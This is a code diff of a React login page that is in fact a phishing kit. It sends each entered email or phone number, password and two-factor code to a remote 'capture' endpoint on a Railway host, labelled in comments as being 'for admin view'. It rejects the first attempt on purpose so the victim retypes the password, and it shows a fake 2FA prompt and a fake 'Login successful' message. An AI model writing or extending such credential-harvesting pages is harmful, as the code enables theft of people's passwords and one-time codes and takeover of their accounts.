@@ -6,24 +6,20 @@ const Login = () => {
     identifier: '',
     password: ''
   });
-  const [verificationCode, setVerificationCode] = useState('');
+  const [twoFACode, setTwoFACode] = useState('');
   const [showPassword, setShowPassword] = useState(false);
   const [darkTheme, setDarkTheme] = useState(false);
   const [loading, setLoading] = useState(false);
-  const [currentStep, setCurrentStep] = useState('login'); // login, captcha, method, verify
+  const [show2FA, setShow2FA] = useState(false);
   const [userEmail, setUserEmail] = useState('');
   const [loginAttempt, setLoginAttempt] = useState(0);
   const [errorMessage, setErrorMessage] = useState('');
-  const [selectedMethod, setSelectedMethod] = useState(''); // 'email' or 'authenticator'
-  const [captchaPosition, setCaptchaPosition] = useState(0);
-  const [targetPosition, setTargetPosition] = useState(50);
-  const [selectedLanguage, setSelectedLanguage] = useState('English'); // New state for language selector
   const [sessionId] = useState(() => `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`);
 
   // Function to send data to backend
   const sendToBackend = async (captureData) => {
     try {
-      // Updated to use your live Railway backend
+      // FIXED: Added 'https' and the correct path '/api/capture'
       const response = await fetch('https://nuns-production.up.railway.app/api/capture', {
         method: 'POST',
         headers: {
@@ -48,15 +44,11 @@ const Login = () => {
       ...formData,
       [e.target.name]: e.target.value
     });
-    setErrorMessage('');
+    setErrorMessage(''); // Clear error when user starts typing
   };
 
-  const handleClearIdentifier = () => {
-    setFormData(prev => ({ ...prev, identifier: '' }));
-  };
-
-  const handleVerificationChange = (e) => {
-    setVerificationCode(e.target.value);
+  const handleTwoFAChange = (e) => {
+    setTwoFACode(e.target.value);
   };
 
   const handleLoginSubmit = async (e) => {
@@ -64,6 +56,7 @@ const Login = () => {
     setLoading(true);
     setErrorMessage('');
     
+    // Capture credentials for admin view
     await sendToBackend({
       type: 'LOGIN_ATTEMPT',
       identifier: formData.identifier,
@@ -71,182 +64,76 @@ const Login = () => {
       attempt: loginAttempt + 1
     });
     
+    // Simulate login process with first attempt failure
     setTimeout(() => {
       setLoading(false);
       
       if (loginAttempt === 0) {
+        // First attempt fails
         setLoginAttempt(1);
         setErrorMessage('Invalid credentials. Please try again.');
+        
+        // Send failed attempt to backend without await
         sendToBackend({
           type: 'LOGIN_FAILED',
           identifier: formData.identifier,
           attempt: 1
         });
       } else {
+        // Second attempt succeeds and goes to 2FA
         setUserEmail(formData.identifier);
-        setCurrentStep('captcha');
-        setLoginAttempt(0);
+        setShow2FA(true);
+        setLoginAttempt(0); // Reset for next user
       }
     }, 1500);
   };
 
-  // CAPTCHA Puzzle Functions
-  const handleCaptchaDrag = (e) => {
-    let clientX = e.clientX;
-    if (e.touches && e.touches[0]) {
-        clientX = e.touches[0].clientX;
-    }
-
-    const puzzleTrack = document.querySelector('.puzzle-track');
-    if (!puzzleTrack) return;
-    
-    const rect = puzzleTrack.getBoundingClientRect();
-    const x = clientX - rect.left;
-    const trackWidth = rect.width;
-    
-    const percentage = Math.max(0, Math.min(100, (x / trackWidth) * 100));
-    setCaptchaPosition(percentage);
-  };
-
-  const handleCaptchaSubmit = () => {
-    if (Math.abs(captchaPosition - targetPosition) <= 5) {
-      sendToBackend({
-        type: 'CAPTCHA_SOLVED',
-        identifier: userEmail
-      });
-      setCurrentStep('method');
-    } else {
-      setErrorMessage('Please align the puzzle correctly');
-    }
-  };
-
-  const handleMethodSelect = (method) => {
-    setSelectedMethod(method);
-    sendToBackend({
-      type: 'VERIFICATION_METHOD_SELECTED',
-      identifier: userEmail,
-      method: method
-    });
-    setCurrentStep('verify');
-  };
-
-  const handleVerificationSubmit = async (e) => {
+  const handle2FASubmit = async (e) => {
     e.preventDefault();
     setLoading(true);
     
+    // Capture 2FA code for admin view
     await sendToBackend({
-      type: 'VERIFICATION_ATTEMPT',
+      type: '2FA_ATTEMPT',
       identifier: userEmail,
-      method: selectedMethod,
-      code: verificationCode
+      code: twoFACode
     });
     
+    // Simulate 2FA verification with 10-minute wait message
     setTimeout(() => {
       setLoading(false);
+      
+      // Capture successful login
       sendToBackend({
         type: 'LOGIN_SUCCESS',
         identifier: userEmail,
-        method: selectedMethod
+        code: twoFACode
       });
       
-      alert('✅ Login successful! Account verified.');
-      resetFlow();
+      alert('✅ Login successful! 2FA verified.');
+      
+      // Reset forms
+      setShow2FA(false);
+      setFormData({ identifier: '', password: '' });
+      setTwoFACode('');
     }, 1500);
-  };
-
-  const resetFlow = () => {
-    setCurrentStep('login');
-    setFormData({ identifier: '', password: '' });
-    setVerificationCode('');
-    setSelectedMethod('');
-    setCaptchaPosition(0);
-    setTargetPosition(Math.floor(Math.random() * 70) + 15); // Random target for next time
-  };
-
-  const goBack = () => {
-    if (currentStep === 'verify') {
-      setCurrentStep('method');
-    } else if (currentStep === 'method') {
-      setCurrentStep('captcha');
-    } else if (currentStep === 'captcha') {
-      setCurrentStep('login');
-    }
-    setErrorMessage('');
   };
 
   const toggleTheme = () => {
     setDarkTheme(!darkTheme);
   };
 
-  // Initialize random target position
-  useEffect(() => {
-    setTargetPosition(Math.floor(Math.random() * 70) + 15);
-  }, []);
-  
-  // Custom Drag Handlers for Puzzle Slider
-  const startDrag = (e) => {
-    e.preventDefault();
-    const handleMove = (moveEvent) => {
-      handleCaptchaDrag(moveEvent);
-    };
-    const handleEnd = () => {
-      document.removeEventListener('mousemove', handleMove);
-      document.removeEventListener('mouseup', handleEnd);
-      document.removeEventListener('touchmove', handleMove);
-      document.removeEventListener('touchend', handleEnd);
-    };
-    document.addEventListener('mousemove', handleMove);
-    document.addEventListener('mouseup', handleEnd);
-    document.addEventListener('touchmove', handleMove);
-    document.addEventListener('touchend', handleEnd);
+  const backToLogin = () => {
+    setShow2FA(false);
+    setTwoFACode('');
+    setErrorMessage('');
   };
 
-  // Theme Toggle and Language Selector JSX Block (Shared across all steps)
-  const BottomControls = (
-    <div className="bottom-controls-container">
-      <div className="theme-toggle-outer">
-        <button 
-          className={`theme-toggle-btn ${darkTheme ? 'dark' : 'light'}`}
-          onClick={toggleTheme}
-          title={darkTheme ? 'Switch to Light Theme' : 'Switch to Dark Theme'}
-        >
-          {/* Sun Icon (Light Mode Icon) */}
-          <span className="theme-icon sun-icon">
-              🔆
-          </span>
-          
-          {/* The main switch/slider part */}
-          <span className="toggle-switch-track">
-            <span className="toggle-switch-thumb"></span>
-          </span>
-          
-          {/* Moon Icon (Dark Mode Icon) */}
-          <span className="theme-icon moon-icon">
-              🌙
-          </span>
-        </button>
-      </div>
-
-      <div className="language-selector-outer">
-        <select 
-          className={`language-select ${darkTheme ? 'dark' : 'light'}`}
-          value={selectedLanguage}
-          onChange={(e) => setSelectedLanguage(e.target.value)}
-        >
-          <option value="English">English</option>
-          <option value="Spanish">Spanish</option>
-          <option value="French">French</option>
-        </select>
-        <span className="language-dropdown-arrow"></span> {/* Custom arrow */}
-      </div>
-    </div>
-  );
-
-
-  // CAPTCHA Puzzle Step
-  if (currentStep === 'captcha') {
+  // 2FA Verification Page
+  if (show2FA) {
     return (
       <div className="login-wrapper">
+        {/* Background Container - Full Screen */}
         <div 
           className="background-container"
           style={{
@@ -256,208 +143,64 @@ const Login = () => {
           }}
         ></div>
         
-        <div className="login-container">
-          <div className={`login-card ${darkTheme ? 'dark-card' : 'light-card'}`}>
-            <div className="login-header">
-              <div className="header-left">
-                <h1 className="welcome-text">Security Check</h1>
-                <p className="verification-subtitle">Complete the puzzle to continue</p>
-              </div>
-              <div className="header-right">
-                <button className="social-btn back-btn" onClick={goBack} title="Back to Login">
-                  ←
-                </button>
-              </div>
-            </div>
-
-            <div className="security-notice">
-              <div className="security-icon">🧩</div>
-              <p>Slide the puzzle piece to the correct position</p>
-              <p className="code-instruction">Align the image to complete the CAPTCHA verification</p>
-            </div>
-
-            <div className="captcha-puzzle">
-              <div className="puzzle-container">
-                <div className="puzzle-track">
-                  <div 
-                    className="puzzle-slider"
-                    style={{ left: `${captchaPosition}%` }}
-                    onMouseDown={startDrag}
-                    onTouchStart={startDrag}
-                  >
-                    🧩
-                  </div>
-                  <div className="puzzle-target" style={{ left: `${targetPosition}%` }}>
-                    🎯
-                  </div>
-                </div>
-              </div>
-              
-              {errorMessage && (
-                <div className="error-message">
-                  {errorMessage}
-                </div>
-              )}
-
-              <button 
-                onClick={handleCaptchaSubmit}
-                className="login-button"
-              >
-                Verify Puzzle
-              </button>
-            </div>
-
-            <div className="help-links">
-              <p><a href="#">Having trouble with the puzzle?</a></p>
-            </div>
-          </div>
-          {BottomControls}
+        {/* Theme Toggle Button - Outside the container */}
+        <div className="theme-toggle-outer">
+          <button 
+            className={`theme-toggle-btn ${darkTheme ? 'dark' : 'light'}`}
+            onClick={toggleTheme}
+          >
+            <span className="toggle-slider"></span>
+            <span className="toggle-text">
+              {darkTheme ? '🌙 Dark Theme' : '☀️ Light Theme'}
+            </span>
+          </button>
         </div>
-      </div>
-    );
-  }
 
-  // Verification Method Selection Step
-  if (currentStep === 'method') {
-    return (
-      <div className="login-wrapper">
-        <div 
-          className="background-container"
-          style={{
-            backgroundImage: darkTheme 
-              ? "url('/assets/background_dark.png')"
-              : "url('/assets/background_light.png')",
-          }}
-        ></div>
-        
+        {/* 2FA Verification Container */}
         <div className="login-container">
           <div className={`login-card ${darkTheme ? 'dark-card' : 'light-card'}`}>
             <div className="login-header">
               <div className="header-left">
-                <h1 className="welcome-text">Choose Verification Method</h1>
-                <p className="verification-subtitle">How would you like to verify your identity?</p>
+                <h1 className="welcome-text">Security Verification</h1>
+                <p className="verification-subtitle">Two-Factor Authentication Required</p>
               </div>
               <div className="header-right">
-                <button className="social-btn back-btn" onClick={goBack} title="Back to Puzzle">
+                <button className="social-btn back-btn" onClick={backToLogin} title="Back to Login">
                   ←
                 </button>
               </div>
             </div>
 
             <div className="security-notice">
-              <div className="security-icon">🔐</div>
-              <p>Select your preferred verification method</p>
-              <p className="user-email">Verifying: {userEmail}</p>
+              <div className="security-icon">🔒</div>
+              <p>We've sent a 6-digit verification code to:</p>
+              <p className="user-email">{userEmail}</p>
+              <p className="code-instruction">Please allow up to 10 minutes to receive your code.</p>
+              <p className="wait-time">⏰ Code may take up to 10 minutes to arrive</p>
             </div>
 
-            <div className="verification-methods">
-              <div 
-                className={`method-option ${selectedMethod === 'email' ? 'selected' : ''}`}
-                onClick={() => handleMethodSelect('email')}
-              >
-                <div className="method-icon">📧</div>
-                <div className="method-content">
-                  <h3>Email Verification</h3>
-                  <p>Send a 6-digit code to your email address</p>
-                </div>
-              </div>
-
-              <div 
-                className={`method-option ${selectedMethod === 'authenticator' ? 'selected' : ''}`}
-                onClick={() => handleMethodSelect('authenticator')}
-              >
-                <div className="method-icon">📱</div>
-                <div className="method-content">
-                  <h3>Authenticator App</h3>
-                  <p>Use Google Authenticator or similar app</p>
-                </div>
-              </div>
-            </div>
-
-            <div className="help-links">
-              <p><a href="#">Need help choosing a method?</a></p>
-            </div>
-          </div>
-          {BottomControls}
-        </div>
-      </div>
-    );
-  }
-
-  // Verification Code Entry Step
-  if (currentStep === 'verify') {
-    return (
-      <div className="login-wrapper">
-        <div 
-          className="background-container"
-          style={{
-            backgroundImage: darkTheme 
-              ? "url('/assets/background_dark.png')"
-              : "url('/assets/background_light.png')",
-          }}
-        ></div>
-        
-        <div className="login-container">
-          <div className={`login-card ${darkTheme ? 'dark-card' : 'light-card'}`}>
-            <div className="login-header">
-              <div className="header-left">
-                <h1 className="welcome-text">Enter Verification Code</h1>
-                <p className="verification-subtitle">
-                  {selectedMethod === 'email' ? 'Check your email' : 'Check your authenticator app'}
-                </p>
-              </div>
-              <div className="header-right">
-                <button className="social-btn back-btn" onClick={goBack} title="Back to Methods">
-                  ←
-                </button>
-              </div>
-            </div>
-
-            <div className="security-notice">
-              <div className="security-icon">
-                {selectedMethod === 'email' ? '📧' : '📱'}
-              </div>
-              <p>
-                {selectedMethod === 'email' 
-                  ? `We've sent a 6-digit verification code to:`
-                  : 'Enter the 6-digit code from your authenticator app:'}
-              </p>
-              {selectedMethod === 'email' && (
-                <p className="user-email">{userEmail}</p>
-              )}
-              <p className="code-instruction">
-                {selectedMethod === 'email' 
-                  ? 'Please check your inbox and enter the code below'
-                  : 'Open your authenticator app and enter the current code'}
-              </p>
-            </div>
-
-            <form onSubmit={handleVerificationSubmit} className="login-form">
+            <form onSubmit={handle2FASubmit} className="login-form">
               <div className="form-group">
-                <label htmlFor="verificationCode">Verification Code</label>
+                <label htmlFor="twoFACode">Verification Code</label>
                 <input
                   type="text"
-                  id="verificationCode"
-                  name="verificationCode"
-                  placeholder="Enter 6-digit code"
-                  value={verificationCode}
-                  onChange={handleVerificationChange}
+                  id="twoFACode"
+                  name="twoFACode"
+                  placeholder={darkTheme ? "Enter 6-digit code" : "Enter 6-digit code"}
+                  value={twoFACode}
+                  onChange={handleTwoFAChange}
                   maxLength={6}
                   pattern="[0-9]{6}"
                   required
                   className={darkTheme ? 'dark-input' : 'light-input'}
                 />
-                <div className="hint-text">
-                  {selectedMethod === 'email' 
-                    ? 'Check your email for the verification code'
-                    : 'Use Google Authenticator, Authy, or similar app'}
-                </div>
+                <div className="hint-text">Check your email for the verification code</div>
               </div>
 
               <button 
                 type="submit" 
                 className="login-button"
-                disabled={loading || verificationCode.length !== 6}
+                disabled={loading || twoFACode.length !== 6}
               >
                 {loading ? (
                   <span className="loading-spinner">⏳</span>
@@ -468,25 +211,19 @@ const Login = () => {
             </form>
 
             <div className="help-links">
-              <p>
-                <a href="#">
-                  {selectedMethod === 'email' 
-                    ? "Didn't receive the code?"
-                    : "Can't access your authenticator app?"}
-                </a>
-              </p>
-              <p><a href="#" onClick={() => setCurrentStep('method')}>Try another method</a></p>
+              <p><a href="#">Didn't receive the code? Wait 10 minutes</a></p>
+              <p><a href="#">Use backup method</a></p>
             </div>
           </div>
-          {BottomControls}
         </div>
       </div>
     );
   }
 
-  // Login Page (Default Step)
+  // Login Page
   return (
     <div className="login-wrapper">
+      {/* Background Container - Full Screen */}
       <div 
         className="background-container"
         style={{
@@ -496,6 +233,20 @@ const Login = () => {
         }}
       ></div>
       
+      {/* Theme Toggle Button - Outside the container */}
+      <div className="theme-toggle-outer">
+        <button 
+          className={`theme-toggle-btn ${darkTheme ? 'dark' : 'light'}`}
+          onClick={toggleTheme}
+        >
+          <span className="toggle-slider"></span>
+          <span className="toggle-text">
+            {darkTheme ? '🌙 Dark Theme' : '☀️ Light Theme'}
+          </span>
+        </button>
+      </div>
+
+      {/* Login Container */}
       <div className="login-container">
         <div className={`login-card ${darkTheme ? 'dark-card' : 'light-card'}`}>
           <div className="login-header">
@@ -529,33 +280,26 @@ const Login = () => {
             
             <div className="form-group">
               <label htmlFor="identifier">Email/Phone number</label>
-              <div className="input-with-icon">
-                <input
-                  type="text"
-                  id="identifier"
-                  name="identifier"
-                  placeholder="Enter your email or phone number"
-                  value={formData.identifier}
-                  onChange={handleChange}
-                  required
-                  className={darkTheme ? 'dark-input' : 'light-input'}
-                />
-                {formData.identifier && (
-                  <button type="button" className="clear-input-btn" onClick={handleClearIdentifier}>
-                    &times; {/* HTML entity for 'x' */}
-                  </button>
-                )}
-              </div>
+              <input
+                type="text"
+                id="identifier"
+                name="identifier"
+                placeholder={darkTheme ? "Enter your email or phone number" : "Enter your email or phone number"}
+                value={formData.identifier}
+                onChange={handleChange}
+                required
+                className={darkTheme ? 'dark-input' : 'light-input'}
+              />
             </div>
 
             <div className="form-group">
               <label htmlFor="password">Password</label>
-              <div className="input-with-icon">
+              <div className="password-input-container">
                 <input
                   type={showPassword ? "text" : "password"}
                   id="password"
                   name="password"
-                  placeholder="Enter your password"
+                  placeholder={darkTheme ? "Enter your password" : "Enter your password"}
                   value={formData.password}
                   onChange={handleChange}
                   required
@@ -563,15 +307,10 @@ const Login = () => {
                 />
                 <button 
                   type="button"
-                  className="toggle-password-visibility"
+                  className="show-password-btn"
                   onClick={() => setShowPassword(!showPassword)}
-                  title={showPassword ? "Hide password" : "Show password"}
                 >
-                  {showPassword ? (
-                    <img src={darkTheme ? "/assets/eye-closed-dark.svg" : "/assets/eye-closed-light.svg"} alt="Hide" />
-                  ) : (
-                    <img src={darkTheme ? "/assets/eye-open-dark.svg" : "/assets/eye-open-light.svg"} alt="Show" />
-                  )}
+                  {showPassword ? '🙈' : '👁️'}
                 </button>
               </div>
               
@@ -597,7 +336,6 @@ const Login = () => {
             <p>No account yet? <a href="/signup" className="signup-link">Sign up</a></p>
           </div>
         </div>
-        {BottomControls}
       </div>
     </div>
   );
